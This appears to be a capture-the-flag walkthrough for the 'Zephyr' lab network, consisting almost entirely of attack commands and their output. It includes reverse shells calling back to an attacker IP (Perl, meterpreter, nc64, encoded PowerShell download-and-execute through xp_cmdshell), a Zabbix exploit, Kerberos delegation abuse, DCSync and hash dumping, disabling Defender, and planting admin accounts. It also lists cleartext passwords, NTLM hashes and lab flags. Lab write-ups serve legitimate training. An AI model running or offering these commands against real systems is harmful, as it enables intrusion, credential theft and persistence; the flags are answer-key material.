# Zephyr

{% code overflow="wrap" %}
```powershell
# IP Subnet
10.10.110.0/24
# Entry Host
10.10.110.35
painters.htb
# Email Addresses
info@painters.htb
# Users
Thomas Bishop
James Ray
Toby Harlington

# mail Server
mail.painters.htb, IP Address:192.168.110.51
# Certificate Authority
zsm-ZPH-SVRCA01-CA
# Attempt to fuzz parameters. 
ffuf -u 'https://painters.htb/views/service.php?FUZZ=1' -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fw 5846


# Privesc
SSH_CONNECTION=10.10.14.3 36916 192.168.110.51 22
Potentially Vulnerable to CVE-2022-2588

blake:x:1002:1002:Blake Morris,,,:/home/blake:/bin/bash                                                                                                                                                               
daniel:x:1001:1001:Daniel Morris,,,:/home/daniel:/bin/bash                                                                                                                                                            
matt:x:1000:1000:Matt Fisher:/home/matt:/bin/bash                                                                                                                                                                     
riley:x:1003:1003:Riley Smart,,,:/home/riley:/bin/bash                                                                                                                                                                
root:x:0:0:root:/root:/bin/bash

# Find the Domain Controller
sudo proxychains nmap -sT -Pn -n 192.168.110.0/24 -p 389
# Confirm the linux account works with the Domain Controller
proxychains crackmapexec smb 192.168.110.55 -u riley -p 'P@ssw0rd'
# Run bloodhound
proxychains bloodhound-python -d painters.htb -u riley -p 'P@ssw0rd' -dc dc.painters.htb -c DCOnly -ns 192.168.110.55 --dns-tcp
# nmap scans
## 192.168.110.52
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds



# shares DC
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 

ssh -D 1080 riley@$ip -fN  
P@ssw0rd
# Kerberoastable
blake
web_svc
proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip 192.168.110.55 painters.htb/riley -outputfile hashes.kerberoast

```
{% endcode %}

## Introduction

{% code overflow="wrap" %}
```bash
ssh riley@$ip
P@ssw0rd
# Create shell to upload
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f elf > shell.elf
# Make shell executeable
chmod +x shell.elf
# Copy shell to linux host
scp shell.elf riley@$ip:/tmp/shell.elf
# In Meterpreter 
use exploit/multi/handler
set payload linux/x64/meterpreter_reverse_tcp
set lport 443
run
# Run shell in background
./shell.elf&


run autoroute -s 192.168.110.0/24

```
{% endcode %}

## Credentials

### Passwords

```bash
# Zabbix Database
zabbix:rDhHbBEfh35sMbkY
# Internal domain mssql_svc account. 
internal\mssql_svc:ToughPasswordToCrack123!
# internal.zsm.local account
melissa:WinterIsHere2022!

# Credentials
PAINTERS\riley:P@ssw0rd
zsm.local\daniel.morris:Welcome1
```

### Hashes

```bash
# Zabbix Database
Admin:$2y$10$BH90bGVo2lv948WpM1haruzrBgVCpzEL5av9BPCewd/Q2pM1Ybl.q
guest:$2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06
marcus:$2y$10$dHMYveVV/xZoM5sc9cPHGe4xUukdyOM91C.LJ8TrpRQA3s1eXhm4.
```

## Disclosure - PNT-SVRSVC

```bash
# Connect with evil-winrm
proxychains evil-winrm -i 192.168.110.52 -u web_svc -p '!QAZ1qaz'

# Hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6ee87fa6593a4798fe651f5f5a4e663e:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
James:1001:aad3b435b51404eeaad3b435b51404ee:8af1903d3c80d3552a84b6ba296db2ea:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::
# SharpHound
.\SharpHound.exe -d painters.htb --ldapusername riley --ldappassword P@ssw0rd
James:8af1903d3c80d3552a84b6ba296db2ea
```

## Persistence  - PNT-SVRBPA

{% code overflow="wrap" %}
```bash
# Use James hash from previous host
proxychains evil-winrm -i 192.168.110.53 -u james -H 8af1903d3c80d3552a84b6ba296db2ea

# Hash dump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:23ea5ff648e7ec7dcd1bfef8e9434099:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
James:1001:aad3b435b51404eeaad3b435b51404ee:8af1903d3c80d3552a84b6ba296db2ea:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# SharpHound
.\SharpHound.exe -d painters.htb --ldapusername riley --ldappassword P@ssw0rd
```
{% endcode %}

## Blake - User account

{% code overflow="wrap" %}
```bash
# Login using a system shell to PNT-SVRBPA
# System Shell
proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py james@192.168.110.53 -hashes :8af1903d3c80d3552a84b6ba296db2ea
# James Shell
proxychains evil-winrm -i 192.168.110.53 -u james -H 8af1903d3c80d3552a84b6ba296db2ea
upload /home/kali/share/PowerView.ps1
# Run PowerShell in system shell
powershell

# Change User password
## Connect as system
proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py james@192.168.110.53 -hashes :8af1903d3c80d3552a84b6ba296db2ea
# Import PowerView
cd \Windows\Tasks
powershell
. .\PowerView.ps1
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity blake -AccountPassword $UserPassword -Credential $Cred
```
{% endcode %}

## DC

{% code overflow="wrap" %}
```bash
# On .53 from Meterpreter
# Request ticket
.\Rubeus.exe s4u /user:blake /rc4:2B576ACBE6BCFDA7294D6BD18041B8FE /impersonateuser:administrator /msdsspn:"cifs/dc.painters.htb" /altservice:http,host,ldap /ptt
# Run mimikatz
mimikatz.exe
# Perform dcsync
lsadump::dcsync /domain:painters.htb /all
```
{% endcode %}

## ZSM.LOCAL Domain

### Enumeration

#### Alive Hosts

```bash
192.168.210.1 - Maybe Router?!?
192.168.210.10 - ZPH-SRVDC01 - Domain Controller
192.168.210.11 - ZPH-SRVMGMT1 - ???
192.168.210.12 - ZPH-SVRCA01 - Web Server / Certificate server?!? 
192.168.210.13 - Zabbix
192.168.210.14 - ZPH-SVRCA01 - adfs.zsm.local
192.168.210.15 - ZPH-SVRSQL01 - SQL
192.168.210.16 - ZPH-SVRCDC01 - Child Domain Controller?!?
192.168.210.17 - ZPH-SVRCHR - !?!
192.168.210.18 - ZPH-SVRCSUP - 
```

#### Port Scans

{% code overflow="wrap" %}
```bash
# 192.168.210.11
PORT    STATE SERVICE       REASON          VERSION
135/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
445/tcp open  microsoft-ds? syn-ack ttl 128
# 192.168.210.12
PORT    STATE SERVICE       REASON          VERSION
80/tcp  open  http          syn-ack ttl 128 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
139/tcp open  netbios-ssn   syn-ack ttl 128 Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds? syn-ack ttl 128
# 192.168.210.13
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
443/tcp open  ssl/http syn-ack ttl 64 nginx 1.18.0 (Ubuntu)
# 192.168.210.14
PORT    STATE SERVICE       REASON          VERSION
80/tcp  open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
135/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
443/tcp open  https?        syn-ack ttl 128
445/tcp open  microsoft-ds? syn-ack ttl 128
# 192.168.210.15
PORT     STATE SERVICE       REASON          VERSION           
135/tcp  open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
445/tcp  open  microsoft-ds? syn-ack ttl 128
1433/tcp open  ms-sql-s      syn-ack ttl 128 Microsoft SQL Server  15.00.2000.00
# 192.168.210.16
PORT     STATE SERVICE       REASON          VERSION              
53/tcp   open  domain?       syn-ack ttl 128                                                               
88/tcp   open  kerberos-sec  syn-ack ttl 128 Microsoft Windows Kerberos
135/tcp  open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 128 Microsoft Windows netbios-ssn                                                                         
389/tcp  open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds? syn-ack ttl 128                      
464/tcp  open  kpasswd5?     syn-ack ttl 128                      
593/tcp  open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0                                                                   
636/tcp  open  ssl/ldap      syn-ack ttl 128 Microsoft Windows Active Directory LDAP  
3268/tcp open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP
3269/tcp open  ssl/ldap      syn-ack ttl 128 Microsoft Windows Active Directory LDAP
# 192.168.210.17
PORT     STATE SERVICE REASON          VERSION
5985/tcp open  http    syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

```
{% endcode %}

### Credentials

```bash
marcuss:!QAZ2wsx
```

### Monitor

#### Console Access

{% code overflow="wrap" %}
```bash
# Download Exploit
wget https://raw.githubusercontent.com/Mr-xn/cve-2022-23131/main/zabbix_session_exp.py
# Uncomment all print statements. 
# Run exploit
proxychains python3 zabbix_session_exp.py -t https://monitor.zsm.local/index_sso.php -u Admin
# Ignore error message then copy cookie into browser and click on SSO button. 
```
{% endcode %}

Access to Zabbix Server

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"># In console navigate to Administration -> Scripts -> Create script
<strong># Set scope = 'Manual host action', type = Script, Execute on = 'Server (proxy)'
</strong><strong>perl -e 'use Socket;$i="10.10.16.207";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&#x26;S");open(STDOUT,">&#x26;S");open(STDERR,">&#x26;S");exec("bash -i");};'
</strong></code></pre>

#### Root

```bash
# Can run nmap as sudo so use GTFO bins.
TF=$(mktemp)
echo 'os.execute("/bin/bash")' > $TF
sudo nmap --script=$TF
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl-z
stty raw -echo
fg <enter>
stty rows 69 columns 287
```

#### Post Exploitation

{% code overflow="wrap" %}
```bash
# Enumerate database
marcuss:!QAZ2wsx
# Create metasploit console session.
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.16.207 LPORT=443 -f elf > shell.elf
mv shell.elf /home/kali/share/
# Download shell
cd /dev/shm
wget 10.10.16.207/shell.elf
# Make shell executeable
chmod +x shell.elf
# In Meterpreter 
use exploit/multi/handler
set payload linux/x64/meterpreter_reverse_tcp
set lport 443
run
# Run shell in background
./shell.elf&
# Setup proxy
use auxiliary/server/socks_proxy
set version 4a
set srvport 8888
run
# Bring back session
sessions -i 1
run autoroute -s 192.168.210.0/24
```
{% endcode %}

### Diverted - ZPH-SVRMGMT1

#### Enumeration

Bloodhound shows

<figure><img src="../../../../.gitbook/assets/image (6) (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
proxychains python3 pywhisker.py -t 'ZPH-SVRMGMT1$' -a add -d zsm.local -u marcus -p '!QAZ2wsx' --dc-ip 192.168.210.10 -f cert -e PEM

proxychains python3 gettgtpkinit.py -cert-pem cert_cert.pem -key-pem cert_priv.pem zsm.local/ZPH-SVRMGMT1$ ZPH-SVRMGMT1$.ccache -dc-ip 192.168.210.10

export KRB5CCNAME=ZPH-SVRMGMT1\$.ccache

proxychains python3 getnthash.py -key b3739c44aded934869c55018f989a07a46da243bd789fbd17024c97466e3fb9d zsm.local/ZPH-SVRMGMT1$ -dc-ip 192.168.210.10

77a8c4abe4fa18606666dfa8c303ddf0
835edf11f5527e13ae63c6846f8f0670
af6c7b9c3130414cef9023c2a393e85c
proxychains pth-net rpc group addmem 'GENERAL MANAGEMENT@ZSM.LOCAL' 'marcus' -U zsm.local/'ZPH-SVRMGMT1$'%ffffffffffffffffffffffffffffffff:77a8c4abe4fa18606666dfa8c303ddf0 -S 192.168.210.10

proxychains pth-net rpc group addmem 'GENERAL MANAGEMENT@ZSM.LOCAL' 'marcus' -U zsm.local/'ZPH-SVRMGMT1$'%ffffffffffffffffffffffffffffffff:77a8c4abe4fa18606666dfa8c303ddf0 -S 192.168.210.10
proxychains rpcclient -U zsm.local/marcus 192.168.210.10
setuserinfo2 jamie 23 P@ssw0rd
quit

type C:\Users\Administrator\Desktop\flag.txt
ZEPHYR{K3y_Cr3d3n714l_l1nk_d4ng3r}

Administrator:500:aad3b435b51404eeaad3b435b51404ee:545c503123664e5713439e088bd91035
proxychains pth-net rpc group addmem 'CA MANAGERS@ZSM.LOCAL' 'ZPH-SVRMGMT1$' -U zsm.local/jamie -S 192.168.210.10
```
{% endcode %}

## ZPH-SVRCA01

{% code overflow="wrap" %}
```bash
# Add Jamie to the CA Managers group
proxychains net rpc group addmem 'CA MANAGERS@ZSM.LOCAL' 'jamie' -U zsm.local/jamie -S 192.168.210.10
# Upload tools
upload /home/kali/share/PowerView.ps1
upload /home/kali/data/OSEP/ActiveDirectoryExploitation/Powermad.ps1
upload /home/kali/data/OSEP/ActiveDirectoryExploitation/PsExec64.exe
upload /home/kali/data/OSEP/ActiveDirectoryExploitation/nc64.exe
upload /home/kali/data/Rubeus.exe
# Start new shell
start /b nc64.exe -e cmd.exe 10.10.16.207 80
# Add new machine account
New-MachineAccount -MachineAccount sexytimes -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
# Setup RBCD Stuff
$ComputerSid = Get-DomainComputer sexytimes -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
# Set Credential for Set-Object command to run as
$SecPassword = ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('ZSM\jamie', $SecPassword)
# Update computer object
Get-DomainComputer ZPH-SVRCA01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Credential $Cred

# Request Ticket with alternative services
Rubeus.exe s4u /user:sexytimes$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/ZPH-SVRCA01.zsm.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /ptt

# Add user account
PsExec64.exe \\ZPH-SVRCA01.zsm.local net user haxor P@ssw0rd /add
PsExec64.exe \\ZPH-SVRCA01.zsm.local net localgroup "Administrators" haxor /add
type \\ZPH-SVRCA01.zsm.local\c$\Users\Administrator\Desktop\flag.txt
ZEPHYR{C0n57r4in3d_d3l3g4710n_1s_d4ng3r0us}

# Hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f027f0fcf9a7470a9276a6484eb336f9
haxor:1000:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42
ZSM.LOCAL/Administrator:$DCC2$10240#Administrator#04a13c983d1c6f2ee43cc9aa0c4d49c6

ZSM.LOCAL/Administrator:$DCC2$10240#
Administrator#04a13c983d1c6f2ee43cc9aa0c4d49c6

[NL$1 - 03/04/2023 17:42:45]
RID       : 000001f4 (500)
User      : ZSM\Administrator
MsCacheV2 : 04a13c983d1c6f2ee43cc9aa0c4d49c6

ZPH-SVRCA01$:ac8f63681a7cb83c659350f7b73f409a
```
{% endcode %}

## The Statement - ZPH-SVRSQL01

{% code overflow="wrap" %}
```bash
# Use zabbix database creds to connect
proxychains /usr/share/doc/python3-impacket/examples/mssqlclient.py 'zabbix'@192.168.210.15
# Enable command execution
sp_configure 'Show Advanced Options', 1; RECONFIGURE;
sp_configure 'xp_cmdshell', 1; RECONFIGURE;
# Setup metasploit
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lport 443
run
# 
EXEC xp_cmdshell 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMgAwADcALwBzAGgAZQBsAGwANgA0AC4AdAB4AHQAIgApACAAfAAgAEkARQBYAA==';
```
{% endcode %}

### Privilege Escalation

```bash
# Upload tools
cd /Windows/Tasks
upload /home/kali/data/OSEP/ActiveDirectoryExploitation/SpoolSample.exe




```

### Post Exploitation

```bash
cd /windows/tasks
upload /home/kali/share/mimikatz.exe
upload /home/kali/share/mimidrv.sys

# Hashes
Administrator:7ac325190bb999ef4ad73b0b67e8e33c
ZPH-SVRSQL01$:d36f5182149612b1f77bb48c3dd454d9

# Flag
type C:\Users\Administrator\Desktop\flag.txt
ZEPHYR{SQLi_2_Imp3rs0n4710n_fun}
```

## The Missing Link - ZSM-SRVCSSQL02

### Exploitation

{% code overflow="wrap" %}
```bash
# On SQL01 impersonate sa account
EXECUTE AS login = 'sa'; SELECT SYSTEM_USER;
# The use linked queries. 
select myuser from openquery("ZSM-SVRCSQL02", 'select SYSTEM_USER as myuser');
# Enable xp_cmdshell
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [ZSM-SVRCSQL02]
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [ZSM-SVRCSQL02]
# Verify command execution
EXEC ('xp_cmdshell ''whoami'';') AT [ZSM-SVRCSQL02]
EXEC ('xp_cmdshell ''powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMgAwADkALwBzAGgAZQBsAGwANgA0AC4AdAB4AHQAIgApACAAfAAgAEkARQBYAA=='';') AT [ZSM-SVRCSQL02]

```
{% endcode %}

### Privlege Escalation

```
cd /windows/tasks
upload /home/kali/data/PetitPotato.exe
PetitPotato.exe 3 cmd
```

### Post Exploitation

{% code overflow="wrap" %}
```bash
# Flag
ZEPHYR{G0tt4_l1nk_Up_4m_1_r1gh7?}
# Hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5dc71607c06cf83eea0f3d789bce419c
ZSM-SRVCSSQL02$:6ecbe72f6d071d3c6793369ecb44865b

```
{% endcode %}

## The Fall - ZPH-SVRCDC01

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"># Login to 192.168.210.11 as administrator
proxychains /usr/share/doc/python3-impacket/examples/psexec.py administrator@192.168.210.11 -hashes :545c503123664e5713439e088bd91035
# Add marcus to local administrators group
net localgroup administrators zsm.local\marcus /add
# Dump DPAPI Secrets
proxychains python3 DonPAPI.py zsm.local/marcus:'!QAZ2wsx'@192.168.210.11
# Connect to sql02 as Administrator
proxychains evil-winrm -i 192.168.210.19 -u administrator -H 5dc71607c06cf83eea0f3d789bce419c
# Add Melissa to the local administrators group on SQL02
net localgroup administrators internal.zsm.local\melissa /add
# Connect to SQL02 as Melissa
proxychains evil-winrm -i 192.168.210.19 -u melissa -p WinterIsHere2022!
# Upload SE backup tools
upload /home/kali/share/SeBackupPrivilegeCmdLets.dll
upload /home/kali/share/SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
# Map a network drive as Melissa
$username = "melissa"
$password = "WinterIsHere2022!"
$pwdSecureString = ConvertTo-SecureString -Force -AsPlainText $password
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $userName, $pwdSecureString
New-PSDrive -Name "X" -Root "\\192.168.210.16\c$" -Persist -PSProvider "FileSystem" -Credential $Credential
# Copy off flag
Copy-FileSeBackupPrivilege X:\Users\Administrator\Desktop\flag.txt C:\temp\flag.txt
type C:\temp\flag.txt
# Flag
ZEPHYR{In73rn4l_D0m41n_D0m1n473d}

# Setup SMB server
python3 /usr/share/doc/python3-impacket/examples/smbserver.py share /tmp -smb2support
proxychains python3 reg.py melissa@192.168.210.16 backup -p '\\10.10.16.208\share'


<strong>Administrator:500:aad3b435b51404eeaad3b435b51404ee:5bdd6a33efe43f0dc7e3b2435579aa53
</strong>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


/usr/share/doc/python3-impacket/examples/secretsdump.py LOCAL -system SYSTEM -security SECURITY -sam SAM

[*] Target system bootKey: 0xb1223a009047a376c120c3630a0f0e48
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5bdd6a33efe43f0dc7e3b2435579aa53:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:34e2ddb4a1a1845db4a3a4fe02d24f5497b312d748422ab3185c25e975b328fc22f24cb130f18f98b63f0b1efa3b2de13e2f1485dab5727e62b7083fa74bad66313cd3f0bc828d1a11dde12ce0b8f20c152422487a2633123b0047fa91b52571ecf88b8abeea0da997783784e5bba0795a57b5bc537fa704c9d13a36c29f75fa00f12a074db38a463a467050da5928406e2d92530e9ee1abc1781e5fffd780ec2936fbfc23ca456703a0ba3383923d2e6ac2ccfd136ff7f4ac9e02fe57436dd56fa5b0d71d3ca4cc25dd33fb822b590dd546e8bad2a3d3e3062c451e533ae63940c669f72c3899429208fc6ce64c8159
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:01560a3f3f290d590d6308e7123d3c3e
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xf108ba9fcd3554a2abb82ff4a8d29f0679aeaae6
dpapi_userkey:0xe57f2322d588ce987f04d6a3b1bf31cfa35d050a
[*] NL$KM 
 0000   07 E9 F2 3F 08 49 46 07  02 CE 30 4B 65 D3 86 32   ...?.IF...0Ke..2
 0010   6F 02 5D 36 7D E8 30 33  F4 71 94 44 98 37 CB 1A   o.]6}.03.q.D.7..
 0020   05 CC 76 F1 26 E2 94 E7  D3 54 78 1F EF BE E9 13   ..v.&#x26;....Tx.....
 0030   30 3B 62 CB A5 57 75 E6  78 F3 D4 55 5C 68 20 15   0;b..Wu.x..U\h .
NL$KM:07e9f23f0849460702ce304b65d386326f025d367de83033f47194449837cb1a05cc76f126e294e7d354781fefbee913303b62cba55775e678f3d4555c682015


proxychains python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc-ntlm 'internal.zsm.local/ZPH-SVRCDC01$'@192.168.210.16 -hashes :01560a3f3f290d590d6308e7123d3c3e

Administrator:500:aad3b435b51404eeaad3b435b51404ee:543beb20a2a579c7714ced68a1760d5e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0540fe51ddd618f42a66ef059ac36441:::
internal.zsm.local\mssql_svc:6101:aad3b435b51404eeaad3b435b51404ee:8cb21ab7f3ee6d782c724216bd88d1d1:::
internal.zsm.local\Emily:6601:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Laura:6602:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Melissa:6603:aad3b435b51404eeaad3b435b51404ee:184260f5bf16a77d67a9d540fda79495:::
internal.zsm.local\Sarah:6604:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Amy:6605:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Steven:6606:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Malcolm:6607:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Aron:6608:aad3b435b51404eeaad3b435b51404ee:8cb21ab7f3ee6d782c724216bd88d1d1:::
internal.zsm.local\Matt:6609:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Jamie:6610:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
ZPH-SVRCDC01$:1000:aad3b435b51404eeaad3b435b51404ee:01560a3f3f290d590d6308e7123d3c3e:::
ZPH-SVRCHR$:1601:aad3b435b51404eeaad3b435b51404ee:33da2c9b3d991549d4c2a973ba068cfb:::
ZPH-SVRCSUP$:1602:aad3b435b51404eeaad3b435b51404ee:7411117723b711f543b2240d316fd219:::
ZSM-SVRCSQL02$:5601:aad3b435b51404eeaad3b435b51404ee:e4242beb303190c09078295519f64a06:::
INT-MAINT$:6102:aad3b435b51404eeaad3b435b51404ee:f83a1c32c875fbbd604c5adc4f4deb1b:::
ZSM$:1103:aad3b435b51404eeaad3b435b51404ee:e186b66ecad8b8a68b5414516bed4a6c:::

</code></pre>

## ZPH-SVRDC01

{% code overflow="wrap" %}
```bash
# Connect to ZPH-SVRCDC01 as DA
proxychains /usr/share/doc/python3-impacket/examples/psexec.py administrator@internal.zsm.local@@192.168.210.18 -hashes :543beb20a2a579c7714ced68a1760d5e
# Disable AV
"C:\Program Files\Windows Defender\MpCmdRun.exe -removedefinitions -all"
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true
# Upload PowerView
upload /home/kali/share/PowerView.ps1
# Import PowerView
. .\PowerView.ps1
Get-DomainGroup -Identity "Domain Admins" -Domain zsm.local -Properties ObjectSid


84210eddc5724a7801fe78289ee94d44
proxychains evil-winrm -i 192.168.210.10 -u administrator -H 84210eddc5724a7801fe78289ee94d44
ZEPHYR{34t1ng_7h3_B0n3s_0f_N3tw0rks}

```
{% endcode %}

Post Exploitation

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong># Dump hashes
</strong><strong>proxychains /usr/share/doc/python3-impacket/examples/secretsdump.py administrator@192.168.210.10 -hashes :84210eddc5724a7801fe78289ee94d44
</strong>
</code></pre>

## The Forgotten - ZPH-SVRADFS1

{% code overflow="wrap" %}
```bash
proxychains evil-winrm -i 192.168.210.14 -u administrator@zsm.local -H 84210eddc5724a7801fe78289ee94d44
ZEPHYR{C4n7_F0rg3t_ab0u7_7h1s_0n3}
```
{% endcode %}
